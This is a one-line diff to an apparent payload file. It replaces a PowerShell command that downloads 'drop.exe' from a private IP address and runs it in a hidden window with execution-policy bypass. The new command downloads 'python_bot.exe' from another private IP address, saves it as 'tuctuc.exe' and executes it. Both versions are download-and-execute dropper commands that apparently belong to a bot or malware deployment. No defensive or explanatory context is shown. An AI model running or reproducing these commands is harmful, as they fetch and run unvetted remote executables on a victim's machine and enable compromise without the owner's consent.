@@ -1,1 +1,1 @@
-powershell -W Hidden -NoP -NonI (New-Object System.Net.WebClient).DownloadFile('http://10.5.5.12:5000/drop.exe','tuctuc.exe');powershell -W Hidden -NoP -NonI  -Exec Bypass Start-Process 'tuctuc.exe'
+powershell  (New-Object System.Net.WebClient).DownloadFile('http://192.168.5.15:5000/uploads/python_bot.exe','tuctuc.exe');Start-Process 'tuctuc.exe';exit;
